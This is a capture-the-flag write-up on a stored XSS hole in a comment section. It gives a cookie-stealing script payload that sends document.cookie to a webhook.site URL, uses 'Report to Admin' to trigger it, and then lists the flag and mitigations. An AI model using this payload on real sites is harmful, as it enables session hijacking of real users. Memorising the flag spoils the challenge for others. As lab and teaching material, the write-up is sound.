# CTF Writeup: Stealing Cookies with XSS

This writeup demonstrates how to exploit a Cross-Site Scripting (XSS) vulnerability to steal cookies from an admin user in a vulnerable comment section.

Reference: [Using Cross Site Scripting (XSS) to Steal Cookies](https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/)

---

## Step 1: Explore the Comment Section

1. Load the target website and navigate to the **comment section**.
2. Try submitting a simple comment with the content:

   ```
   123<>" 
   ```

3. After submission, you may be redirected to the default skrctf website. This is expected—simply navigate back to the comment section and make sure the service port is open.
4. Once back, check your comment on the page. You should see the exact text `123<>""` rendered as is.
5. View the page source to verify any encoding. You'll notice **there is no encoding or sanitization of special characters**. This confirms the website is vulnerable to XSS attacks.

---

## Step 2: Test XSS Injection

1. Go to [Webhook.site](https://webhook.site/) and generate a unique URL to collect incoming HTTP requests.
2. Submit a comment to test basic XSS with this payload:

   ```
   <script>alert(1)</script>
   ```

3. Reload and revisit the website. You should see a JavaScript alert box with "1" pop up immediately, demonstrating successful script injection.

---

## Step 3: Steal Admin Cookies Using XSS

1. Replace `[URL]` below with your webhook URL from Step 2 (remove brackets):

   ```
   <script>document.write('<img src="[URL]?c='+document.cookie+'" />');</script>
   ```

   Example if your URL is `http://example.webhook.site/abcd`:

   ```
   <script>document.write('<img src="http://example.webhook.site/abcd?c='+document.cookie+'" />');</script>
   ```

2. Submit this comment payload to the vulnerable comment section.
3. Reload the website. The alert will pop up again since the `<script>` runs.
4. Click **Report to Admin** which triggers the admin to visit the page containing your injected script.
5. Go back to your webhook dashboard to view the incoming requests. You will see the admin’s cookie sent to your webhook URL.

---

## Flag

```
SKR{Ste4l1ng_4Dm1n_C0Ok135sss_330017}
```

---

## Mitigations

- Always sanitize and encode user-supplied input, especially before rendering on the page.
- Implement Content Security Policy (CSP) headers.
- Use HttpOnly and Secure flags on cookies to protect them from JavaScript access.
- Regular security reviews and testing for XSS vulnerabilities.
```
